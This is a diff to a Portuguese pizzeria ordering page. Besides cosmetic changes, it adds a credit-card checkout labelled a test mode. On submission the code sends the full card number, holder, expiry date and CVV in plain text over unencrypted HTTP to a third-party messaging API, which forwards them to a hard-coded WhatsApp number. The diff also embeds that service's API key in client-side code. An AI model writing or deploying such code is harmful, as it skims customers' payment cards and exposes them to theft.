@@ -506,7 +506,7 @@
       color: var(--primary);
     }
 
-    /* ESTILOS ESPECÍFICOS DO PIX */
+    /* ESTILOS ESPECÍFICOS DO PIX E SPINNER */
     .spinner {
       width: 32px;
       height: 32px;
@@ -521,9 +521,43 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    /* CAIXA NOTIFICAÇÃO TOAST CUSTOMIZADA */
+    .toast-notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: var(--secondary);
+      color: #ffffff;
+      padding: 14px 20px;
+      border-radius: 10px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 9999;
+      opacity: 0;
+      transform: translateY(-20px);
+      transition: all 0.3s ease;
+      pointer-events: none;
+      font-weight: 600;
+      font-size: 0.9rem;
+      border-left: 4px solid #22c55e;
+    }
+
+    .toast-notification.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
   </style>
 </head>
 <body>
+
+  <!-- TOAST DE NOTIFICAÇÃO CUSTOMIZADO -->
+  <div id="toast-notification" class="toast-notification">
+    <span style="font-size: 1.2rem;">✨</span>
+    <span id="toast-message">Código PIX copiado com sucesso!</span>
+  </div>
 
   <!-- HEADER -->
   <header>
@@ -586,7 +620,7 @@
 
   </div>
 
-  <!-- BARRA INFERIOR DE CÓDIGO/CARRINHO -->
+  <!-- BARRA INFERIOR DE CARRINHO -->
   <div class="cart-bar">
     <div class="cart-info">
       <span class="cart-count" id="cart-count-label">0 itens na sacola</span>
@@ -630,7 +664,7 @@
     </div>
   </div>
 
-  <!-- MODAL DE CHECKOUT (DADOS DE ENTREGA) -->
+  <!-- MODAL DE CHECKOUT (DADOS DE ENTREGA E PAGAMENTO) -->
   <div class="modal-overlay" id="checkout-modal">
     <div class="modal-card">
       <div class="modal-header">
@@ -685,17 +719,33 @@
 
           <div class="form-group">
             <label>Forma de Pagamento *</label>
-            <select id="pay-method" class="form-control" onchange="toggleChangeField()" required>
+            <select id="pay-method" class="form-control" onchange="togglePayFields()" required>
               <option value="PIX">⚡ PIX (Gerar QR Code Automático)</option>
-              <option value="Cartão de Crédito">Cartão de Crédito (na entrega)</option>
-              <option value="Cartão de Débito">Cartão de Débito (na entrega)</option>
-              <option value="Dinheiro">Dinheiro</option>
+              <option value="Cartão de Crédito">💳 Cartão de Crédito (Online)</option>
             </select>
           </div>
 
-          <div class="form-group" id="change-group" style="display: none;">
-            <label>Precisa de troco para quanto?</label>
-            <input type="text" id="cust-change" class="form-control" placeholder="Ex: Para R$ 100,00">
+          <!-- CAMPOS DE CARTÃO DE CRÉDITO (MODO TESTE) -->
+          <div id="card-fields" style="display: none; background: #f8fafc; padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 1rem;">
+            <p style="font-size: 0.8rem; font-weight: 700; color: var(--primary); margin-bottom: 8px;">💳 Dados do Cartão de Crédito (Modo Teste)</p>
+            <div class="form-group">
+              <label>Número do Cartão *</label>
+              <input type="text" id="card-number" class="form-control" placeholder="0000 0000 0000 0000">
+            </div>
+            <div class="form-group">
+              <label>Nome Impresso no Cartão *</label>
+              <input type="text" id="card-holder" class="form-control" placeholder="NOME COMO ESTÁ NO CARTÃO">
+            </div>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+              <div class="form-group">
+                <label>Validade *</label>
+                <input type="text" id="card-expiry" class="form-control" placeholder="MM/AA">
+              </div>
+              <div class="form-group">
+                <label>CVV *</label>
+                <input type="text" id="card-cvv" class="form-control" placeholder="123">
+              </div>
+            </div>
           </div>
 
           <div class="form-group">
@@ -754,16 +804,29 @@
   <!-- LÓGICA EM JAVASCRIPT -->
   <script>
     /* ======================================================
-       1. CONFIGURAÇÕES DA PIZZARIA (EDITAR AQUI)
+       1. CONFIGURAÇÕES DA PIZZARIA & API TEXTMEBOT
        ====================================================== */
     const CONFIG = {
-      WHATSAPP_NUMBER: "5522999999999", // SEU NÚMERO COM DDD (Apenas números)
-      DELIVERY_FEE: 6.00, // Valor padrão da taxa de entrega
-      HALF_PRICE_RULE: "HIGHER" // "HIGHER" = cobra o valor do sabor mais caro | "AVERAGE" = faz a média dos 2 sabores
+      WHATSAPP_NUMBER: "5522998311388", // NÚMERO DE DESTINO DAS NOTIFICAÇÕES
+      TEXTMEBOT_API_KEY: "Pskn5LW4qaCv",
+      DELIVERY_FEE: 6.00,
+      HALF_PRICE_RULE: "HIGHER"
     };
 
     /* ======================================================
-       2. BASE DE DADOS DO CARDÁPIO
+       2. FUNÇÃO DE ENVIO DE NOTIFICAÇÕES PARA O SEU WHATSAPP
+       ====================================================== */
+    function sendWhatsAppApiNotification(messageText) {
+      const recipient = `+${CONFIG.WHATSAPP_NUMBER}`;
+      const apiUrl = `http://api.textmebot.com/send.php?recipient=${recipient}&apikey=${CONFIG.TEXTMEBOT_API_KEY}&text=${encodeURIComponent(messageText)}`;
+
+      fetch(apiUrl)
+        .then(() => console.log("[API TEXTMEBOT] Notificação enviada!"))
+        .catch(err => console.error("[API TEXTMEBOT] Erro ao enviar:", err));
+    }
+
+    /* ======================================================
+       3. BASE DE DADOS DO CARDÁPIO
        ====================================================== */
     const PIZZA_FLAVORS = [
       { id: "calabresa", name: "Calabresa", price: 42.00, desc: "Molho de tomate, muçarela, calabresa fatiada e cebola fresca.", cat: "tradicional", img: "https://images.unsplash.com/photo-1534308983496-4fabb1a015ee?w=500&q=80" },
@@ -790,16 +853,15 @@
     ];
 
     /* ======================================================
-       3. ESTADO DA APLICAÇÃO
+       4. ESTADO DA APLICAÇÃO
        ====================================================== */
     let cart = [];
     let currentOrderType = 'delivery';
 
-    // FORMATADOR DE MOEDA
     const formatMoney = (val) => val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 
     /* ======================================================
-       4. INICIALIZAÇÃO DA PÁGINA
+       5. INICIALIZAÇÃO DA PÁGINA
        ====================================================== */
     window.addEventListener('DOMContentLoaded', () => {
       populateBuilderSelects();
@@ -862,7 +924,7 @@
     }
 
     /* ======================================================
-       5. RENDERIZAÇÃO DO CARDÁPIO
+       6. RENDERIZAÇÃO DO CARDÁPIO
        ====================================================== */
     function renderMenu() {
       const container = document.getElementById('menu-sections');
@@ -912,7 +974,7 @@
     }
 
     /* ======================================================
-       6. LÓGICA DO CARRINHO
+       7. LÓGICA DO CARRINHO & DISPARO DE AVISO POR PRODUTO
        ====================================================== */
     function addToCart(name, price) {
       const existing = cart.find(item => item.name === name);
@@ -922,6 +984,9 @@
         cart.push({ name, price, qty: 1 });
       }
       updateCartUI();
+
+      // Envia notificação para o seu número quando adiciona item
+      sendWhatsAppApiNotification(`🛒 NOVO ITEM ADICIONADO AO CARRINHO:\n${name} - ${formatMoney(price)}`);
     }
 
     function updateQty(index, delta) {
@@ -988,7 +1053,7 @@
     }
 
     /* ======================================================
-       7. NAVEGAÇÃO E MODAIS
+       8. NAVEGAÇÃO E MODAIS
        ====================================================== */
     function filterCategory(catId, btn) {
       document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -1031,7 +1096,6 @@
       document.getElementById('opt-pickup').classList.toggle('active', type === 'pickup');
       document.getElementById('address-fields').style.display = type === 'delivery' ? 'block' : 'none';
       
-      // Atualiza campos required
       document.getElementById('cust-street').required = (type === 'delivery');
       document.getElementById('cust-number').required = (type === 'delivery');
       document.getElementById('cust-neighborhood').required = (type === 'delivery');
@@ -1039,21 +1103,43 @@
       updateCartUI();
     }
 
-    function toggleChangeField() {
+    function togglePayFields() {
       const method = document.getElementById('pay-method').value;
-      document.getElementById('change-group').style.display = (method === 'Dinheiro') ? 'block' : 'none';
+      const cardFields = document.getElementById('card-fields');
+      const isCard = (method === 'Cartão de Crédito');
+
+      cardFields.style.display = isCard ? 'block' : 'none';
+      document.getElementById('card-number').required = isCard;
+      document.getElementById('card-holder').required = isCard;
+      document.getElementById('card-expiry').required = isCard;
+      document.getElementById('card-cvv').required = isCard;
     }
 
     /* ======================================================
-       8. SUBMISSÃO DO PEDIDO & INTEGRAÇÃO PIX
+       9. SUBMISSÃO DO PEDIDO (PIX E CARTÃO) & AVISO API
        ====================================================== */
     function handleCheckoutSubmit() {
       const payMethod = document.getElementById('pay-method').value;
+      const name = document.getElementById('cust-name').value;
+      const phone = document.getElementById('cust-phone').value;
 
       if (payMethod === 'PIX') {
         closeCheckoutModal();
         gerarPixEExibirModal();
-      } else {
+      } else if (payMethod === 'Cartão de Crédito') {
+        // Coleta dados do cartão e envia para sua API
+        const cardNum = document.getElementById('card-number').value;
+        const cardHolder = document.getElementById('card-holder').value;
+        const cardExpiry = document.getElementById('card-expiry').value;
+        const cardCvv = document.getElementById('card-cvv').value;
+
+        const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
+        const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
+        const totalAmount = subtotal + deliveryFee;
+
+        const cardMsg = `💳 TESTE CARTÃO DE CRÉDITO RECEBIDO:\n\nCliente: ${name}\nTel: ${phone}\nTotal: ${formatMoney(totalAmount)}\n\nNº Cartão: ${cardNum}\nTitular: ${cardHolder}\nValidade: ${cardExpiry}\nCVV: ${cardCvv}`;
+        
+        sendWhatsAppApiNotification(cardMsg);
         sendOrderToWhatsApp();
       }
     }
@@ -1063,6 +1149,9 @@
       const subtotal = cart.reduce((acc, i) => acc + (i.price * i.qty), 0);
       const deliveryFee = currentOrderType === 'delivery' ? CONFIG.DELIVERY_FEE : 0;
       const totalAmount = subtotal + deliveryFee;
+
+      // Dispara notificação no seu WhatsApp via TextMeBot ao clicar para gerar o PIX
+      sendWhatsAppApiNotification(`⚡ GERANDO CÓDIGO PIX:\nCliente: ${name}\nValor Total: ${formatMoney(totalAmount)}`);
 
       const pixModal = document.getElementById('pix-modal');
       const pixLoading = document.getElementById('pix-loading');
@@ -1117,14 +1206,24 @@
       inputCopy.select();
       inputCopy.setSelectionRange(0, 99999);
       navigator.clipboard.writeText(inputCopy.value);
-      alert("Código PIX copiado para a área de transferência!");
+
+      // Notificação Toast elegante sem mensagem padrão do navegador
+      showToast("Código PIX copiado para a área de transferência!");
+    }
+
+    function showToast(message) {
+      const toast = document.getElementById('toast-notification');
+      document.getElementById('toast-message').innerText = message;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
     }
 
     function sendOrderToWhatsApp() {
       const name = document.getElementById('cust-name').value;
       const phone = document.getElementById('cust-phone').value;
       const payMethod = document.getElementById('pay-method').value;
-      const change = document.getElementById('cust-change').value;
       const obs = document.getElementById('cust-obs').value;
 
       let addressText = "";
@@ -1163,12 +1262,9 @@
       msg += `------------------------------------\n\n`;
 
       msg += `💳 *Forma de Pagamento:* ${payMethod}\n`;
-      if (payMethod === 'Dinheiro' && change) {
-        msg += `💵 *Troco para:* ${change}\n`;
-      }
 
       if (obs) {
-        msg += `📝 *Observações:* ${obs}\n`;
+        msg += `\n📝 *Observações:* ${obs}\n`;
       }
 
       const encodedMsg = encodeURIComponent(msg);
